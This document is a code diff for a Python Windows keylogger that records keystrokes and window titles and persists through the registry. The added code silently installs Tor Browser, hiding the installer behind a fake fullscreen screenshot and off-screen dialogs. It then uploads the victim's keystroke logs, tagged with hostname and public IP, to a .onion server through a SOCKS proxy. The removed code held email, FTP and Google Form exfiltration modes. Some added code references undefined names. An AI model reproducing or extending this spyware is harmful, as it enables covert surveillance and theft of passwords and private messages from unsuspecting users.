@@ -6,6 +6,7 @@ import win32event, \
        win32api, winerror  # for disallowing multiple instances
 import win32gui, \
     win32console           # for getting window titles and hiding the console window
+import win32ui, win32con
 from winreg import OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
 
 
@@ -33,12 +34,9 @@ if mode != "debug":
 
 
 import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
-import time
 import psutil
-import ctypes              # for getting window titles, current keyboard layout and capslock state
-import threading, smtplib  # for emailing logs
-import ftplib              # for sending logs via FTP
-import urllib              # for accessing Google Forms
+from ctypes import WinDLL  # for getting window titles, current keyboard layout and capslock state
+import urllib.request
 import datetime            # for getting the current time and using timedelta
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
@@ -46,8 +44,16 @@ import Cryptodome.Util
 from Cryptodome.Hash import SHA3_512
 import base64
 import hashlib             # for hashing the names of files
-import random
-import ctypes
+import threading
+import requests
+import pysocks
+import socket
+from random import choice, shuffle
+from pywinauto.application import Application
+import pywinauto.timings
+import tkinter as tk
+from PIL import Image, ImageGrab, ImageTk
+import re
 
 
 # Disallowing multiple instances
@@ -62,6 +68,10 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 # CONSTANTS
 PYTHON_EXEC_PATH = 'python'  # used only when executable=False.
 # Examples: 'C:\\...\\python.exe' or 'python' if it is on your PATH.
+proxies = {'http': 'socks5h://127.0.0.1:9150',
+           'https': 'socks5h://127.0.0.1:9150'}
+url_server_upload = "https://3g2upl4pq6kufc4m3g2upl4pq6kufc4m.onion/upload"
+url_server_check_connection = "https://3g2upl4pq6kufc4m3g2upl4pq6kufc4m.onion/check"
 
 
 # Add to startup for persistence
@@ -215,7 +225,7 @@ cyrillic_layouts = ['Russian', 'Russian - Moldava', 'Azeri (Cyrillic)', 'Belarus
 
 def detect_key_layout():
     global lcid_dict
-    user32 = ctypes.WinDLL('user32', use_last_error=True)
+    user32 = WinDLL('user32', use_last_error=True)
     curr_window = user32.GetForegroundWindow()
     thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
     klid = user32.GetKeyboardLayout(thread_id)
@@ -234,7 +244,7 @@ def detect_key_layout():
 
 def get_capslock_state():
     # using the answer here https://stackoverflow.com/a/21160382
-    hll_dll = ctypes.WinDLL("User32.dll")
+    hll_dll = WinDLL("User32.dll")
     vk = 0x14
     return True if hll_dll.GetKeyState(vk) == 1 else False
 
@@ -264,8 +274,7 @@ initial_language = detect_key_layout()
 
 def encrypt(message_str):
     global public_key, CHAR_LIMIT
-    # Import the Public Key and use for encryption using PKCS1_OAEP (RSAES-OAEP).
-    # See https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Cipher.PKCS1_OAEP-module.html
+    # Import the Public Key and use for encryption using PKCS1_OAEP (RSAES-OAEP)
     key = RSA.importKey(public_key)
     cipher = PKCS1_OAEP.new(key, hashAlgo=SHA3_512)
     message = bytes(message_str, 'utf-8')
@@ -284,121 +293,205 @@ def encrypt(message_str):
     return encrypted_message
 
 
+def check_internet():
+    protocols = ['https://', 'http://']
+    sites_list = ['www.google.com', 'youtube.com', 'tmall.com', 'baidu.com', 'sohu.com', 'facebook.com',
+                  'taobao.com', 'login.tmall.com', 'wikipedia.org', 'yahoo.com', '360.cn', 'amazon.com', 'jd.com',
+                  'weibo.com', 'sina.com.cn', 'live.com', 'pages.tmall.com', 'reddit.com', 'vk.com', 'netflix.com',
+                  'blogspot.com', 'alipay.com', 'csdn.net', 'bing.com', 'yahoo.co.jp', 'Okezone.com', 'instagram.com',
+                  'google.com.hk', 'office.com']  # most popular websites in the world
+    try:
+        random_protocol = choice(protocols)
+        random_site = choice(sites_list)
+        urllib.request.urlopen(random_protocol + random_site)
+        return True
+    except:
+        try:
+            if random_protocol == 'https://':  # ensure switch to http (just in case)
+                random_protocol = 'http://'
+            urllib.request.urlopen(random_protocol + choice(sites_list))
+            return True
+        except:
+            return False
+
+
+def find_file(root_folder, dir, file):
+    for root, dirs, files in os.walk(root_folder):
+        for f in files:
+            file_search = (file == f)
+            dir_search = (dir in root)
+            if file_search and dir_search:
+                return os.path.join(root, f)
+    return
+
+
+def find_file_in_all_drives(path):
+    # create a regular expression for the file
+    dir = os.path.split(path)[0]
+    file = os.path.split(path)[-1]
+    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
+        result = find_file(drive, dir, file)
+        if result:
+            return result
+
+
+def check_if_tor_browser_is_installed():
+    return find_file_in_all_drives('Tor Browser\\Browser\\firefox.exe')
+
+
+def show_screenshot():
+    root = tk.Toplevel()
+    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
+    root.overrideredirect(1)
+    root.geometry("%dx%d+0+0" % (w, h))
+    root.focus_set()
+    root.bind("<Escape>", lambda e: (e.widget.withdraw(), e.widget.quit()))
+    canvas = tk.Canvas(root, width=w, height=h)
+    canvas.pack()
+    canvas.configure(background='black')
+    screenshot = ImageGrab.grab()
+    ph = ImageTk.PhotoImage(screenshot)
+    canvas.create_image(w/2, h/2, image=ph)
+    root.mainloop()
+    return
+
+
+def install_tor_browser():
+    if not os.name == "nt":
+        return ''  # TODO: Linux, MacOS
+    # 1. Download the installer
+    try:
+        r = requests.get("http://www.torproject.org/download/")
+        if r.status_code == 200:
+            tor_windows_url = r.text.split(".exe")[0].split("href=\"")[-1] + ".exe"
+        else:
+            tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
+    except requests.exceptions.ConnectionError:
+        tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
+    try:
+        tor_installer = requests.get(tor_windows_url)
+    except requests.exceptions.ConnectionError:
+        return ''
+    installer_path = os.path.join(dir_path, tor_windows_url.split("/")[-1])
+    open(installer_path, 'wb').write(tor_installer.content)
+    # 2. Install
+    installation_dir = os.path.join(dir_path, "Tor_Browser")
+    os.remove(installation_dir)
+
+    import multiprocessing
+    screenshot_process = multiprocessing.Process(target=show_screenshot, args=())
+    screenshot_process.start()
+
+    try:
+        app = Application(backend="win32").start(installer_path)
+    except:
+        return ''
+    try:
+        app.Dialog.OK.wait('ready', timeout=30)
+        app.Dialog.move_window(x=-2000, y=-2000)
+        app.Dialog.OK.click()
+        app.InstallDialog.Edit.wait('ready', timeout=30)
+        app.Dialog.move_window(x=-2000, y=-2000)
+        app.InstallDialog.Edit.set_edit_text(installation_dir)
+        app.InstallDialog.InstallButton.wait('ready', timeout=30).click()
+        try:
+            app.InstallDialog.children()[0]
+            if type(app.InstallDialog.children()[0]) == pywinauto.controls.win32_controls.ButtonWrapper:
+                app.InstallDialog.children()[0].click()  # Overwrite - Yes
+        except:
+            pass
+    except pywinauto.timings.TimeoutError:
+        app.kill()
+    try:
+        app.InstallDialog.CheckBox.wait('ready', timeout=30).uncheck()
+        app.InstallDialog.CheckBox2.wait('ready', timeout=30).uncheck()
+        app.InstallDialog.FinishButton.wait('ready', timeout=30).click()
+    except pywinauto.timings.TimeoutError:
+        app.kill()
+
+    screenshot_process.terminate()
+
+    # 3. Remove the installer
+    os.remove(installer_path)
+    return tor_installation_dir
+
+
+def open_tor_browser(installation_dir):
+    pass
+
+
+def find_the_previous_log_and_send():
+    if not check_internet():
+        return
+    # Find the old log
+    found_filenames = []
+    delta = 1
+    while delta <= 366:
+        previous_date = (datetime.date.today() - timedelta(days=delta)).strftime('%Y-%b-%d')
+        previous_date_hashed = hashlib.md5(bytes(previous_date, 'utf-8')).hexdigest()
+        if os.path.exists(previous_date_hashed + ".txt"):
+            found_filenames.append(previous_date_hashed + ".txt")
+        delta += 1
+    # check if TOR is installed
+    tor_installation_dir = check_if_tor_browser_is_installed()
+    if tor_installation_dir == '':
+        tor_installation_dir = install_tor_browser()
+    if tor_installation_dir == '':
+        return True  # ONE DOES NOT SIMPLY USE CLEARNET.
+    else:  # USE DARKNET ONLY
+        open_tor_browser(tor_installed[1])
+        for found_filename in found_filenames:
+            # Now that we found the old log files (found_filename), send them to our server.
+            server_parser_list = [(r'http://jsonip.com', "r.json()['ip']"),
+                                  (r'https://ifconfig.co/json', "r.json()['ip']"),
+                                  (r'http://ip.42.pl/raw', "r.text"),
+                                  (r'http://httpbin.org/ip', "r.json()['origin'].split(", ")[0]"),
+                                  (r'https://api.ipify.org/?format=json', "r.json()['ip']")]
+            shuffle(server_parser_list)
+            ip = ""
+            counter = 0
+            while counter < 5:
+                try:
+                    r = requests.get(server_parser_list[counter][0])
+                    if r.status_code == 200:
+                        ip = eval(server_parser_list[counter][1])
+                        break
+                except requests.exceptions.ConnectionError:
+                    pass
+                counter += 1
+            new_found_filename = str(socket.getfqdn()) + ("_" if ip != "" else "") + ip + "_" + found_filename
+            os.rename(found_filename, new_found_filename)  # rename the file to avoid async errors
+            sent_status_code = requests.get(url_server_check_connection, proxies=proxies).status_code
+            if sent_status_code == 200:  # send logs
+                uploaded_status = requests.post(url_server_upload,
+                                                proxies=proxies,
+                                                data=open(new_found_filename, "rb").read()).status_code
+                if uploaded_status == 200:
+                    os.remove(new_found_filename)
+    return True
+
+
 def log_local():
     # Local mode
     global dir_path, line_buffer, backspace_buffer_len, window_name, time_logged
     todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
-    # md5 only for masking dates - it's easily crackable:
+    # md5 only for masking dates - it's easily crackable for us:
     todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
+    # We need to check if it is a new day, if so, send the old log to the server.
+    if not os.path.exists(todays_date_hashed + ".txt"):  # a new day, a new life...
+        if mode == "remote":
+            # Evaluate find_the_previous_log_and_send asynchronously
+            thr = threading.Thread(target=find_the_previous_log_and_send, args=(), kwargs={})
+            thr.start()
+            # thr.is_alive()  # check if it is alive
+            # thr.join()
     try:
         with open(os.path.join(dir_path, todays_date_hashed + ".txt"), "a") as fp:
             fp.write(line_buffer)
     except:
-        # if there's a problem with a file size: rename the old one, and continue as normal
-        counter = 0
-        while os.path.exists(os.path.join(dir_path, todays_date_hashed + "_" + str(counter) + ".txt")):
-            counter += 1
-        try:
-            os.rename(os.path.join(dir_path, todays_date_hashed + ".txt"),
-                      os.path.join(dir_path, todays_date_hashed + "_" + str(counter) + ".txt"))
-            window_name = ''
-            time_logged = datetime.datetime.now() - datetime.timedelta(minutes=MINUTES_TO_LOG_TIME)
-        except Exception as e:
-            if mode == "debug":
-                print(e)
-    line_buffer, backspace_buffer_len = '', 0
-    return True
-
-
-def log_remote():
-    # Remote mode - Google Form logs post
-    global line_buffer, backspace_buffer_len
-    url = "https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Specify Google Form URL here
-    klog = {'entry.xxxxxxxxxxx': line_buffer}  # Specify the Field Name here
-    try:
-        dataenc = urllib.parse.urlencode(klog)
-        req = urllib.Request(url, dataenc)
-        response = urllib.request.urlopen(req)
-        line_buffer, backspace_buffer_len = '', 0
-    except Exception as e:
-        if mode == "debug":
-            print(e)
-    return True
-
-
-class TimerClass(threading.Thread):
-    # Email mode
-    def __init__(self):
-        threading.Thread.__init__(self)
-        self.event = threading.Event()
-
-    def run(self):
-        while not self.event.is_set():
-            global line_buffer, backspace_buffer_len
-            ts = datetime.datetime.now()
-            SERVER = "smtp.gmail.com"  # Specify Server Here
-            PORT = 587  # Specify Port Here
-            USER = "your_email@gmail.com"  # Specify Username Here
-            PASS = "password_here"  # Specify Password Here
-            FROM = USER  # From address is taken from username
-            TO = ["to_address@gmail.com"]  # Specify to address.Use comma if more than one to address is needed.
-            SUBJECT = "Keylogger data: " + str(ts)
-            MESSAGE = line_buffer
-            message = """\
-From: %s
-To: %s
-Subject: %s
-
-%s
-""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
-            try:
-                server = smtplib.SMTP()
-                server.connect(SERVER, PORT)
-                server.starttls()
-                server.login(USER, PASS)
-                server.sendmail(FROM, TO, message)
-                line_buffer, backspace_buffer_len = '', 0
-                server.quit()
-            except Exception as e:
-                if mode == "debug":
-                    print(e)
-            self.event.wait(120)
-
-
-def log_ftp():
-    # FTP mode - Upload logs to FTP account
-    global line_buffer, count, backspace_buffer_len
-    todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
-    # md5 only for masking dates - it's easily crackable:
-    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
-    count += 1
-    FILENAME = todays_date_hashed + "-" + str(count) + ".txt"
-    try:
-        with open(FILENAME, "a") as fp:
-            fp.write(line_buffer)
-    except Exception as e:
         if mode == "debug":
             print(e)
     line_buffer, backspace_buffer_len = '', 0
-    try:
-        SERVER = "ftp.xxxxxx.com"  # Specify your FTP Server address
-        USERNAME = "ftp_username"  # Specify your FTP Username
-        PASSWORD = "ftp_password"  # Specify your FTP Password
-        SSL = 1  # Set 1 for SSL and 0 for normal connection
-        OUTPUT_DIR = "/"  # Specify output directory here
-        if SSL == 0:
-            ft = ftplib.FTP(SERVER, USERNAME, PASSWORD)
-        else:
-            ft = ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)
-        ft.cwd(OUTPUT_DIR)
-        with open(FILENAME, 'rb') as fp:
-            cmd = 'STOR' + ' ' + FILENAME
-            ft.storbinary(cmd, fp)
-            ft.quit()
-        os.remove(FILENAME)
-    except Exception as e:
-        if mode == "debug":
-            print(e)
     return True
 
 
@@ -442,7 +535,7 @@ def key_callback(event):
     window_buffer, time_buffer = '', ''
 
     # 1. Detect the active window change - if so, LOG THE WINDOW NAME
-    user32 = ctypes.WinDLL('user32', use_last_error=True)
+    user32 = WinDLL('user32', use_last_error=True)
     curr_window = user32.GetForegroundWindow()
     event_window_name = win32gui.GetWindowText(curr_window)
     if window_name != event_window_name:
